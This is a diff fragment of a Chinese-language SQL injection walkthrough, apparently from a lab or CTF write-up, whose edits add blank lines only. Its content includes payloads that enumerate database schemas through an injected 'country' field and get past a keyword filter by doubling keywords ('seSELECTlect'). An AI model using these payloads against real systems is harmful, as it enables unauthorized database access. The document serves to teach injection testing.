@@ -203,7 +203,9 @@ bronze
 (但注意：即使不成功也可能是存在sql过滤的原因，不能用来否定查询语句推断错误)
 
 九、数据库枚举
+
 枚举数据库
+
 gold=1,country=(select group_concat(schema_name) from information_schema.schemata)
 
 测试发现失败，所以因存在过滤器
@@ -227,6 +229,7 @@ gold=1,country="SESELECTLECT"
 成功绕过过滤。
 
 获取数据库：
+
 gold=1,country=(seSELECTlect group_concat(schema_name) from infoORrmation_schema.schemata)
 
 bac_test
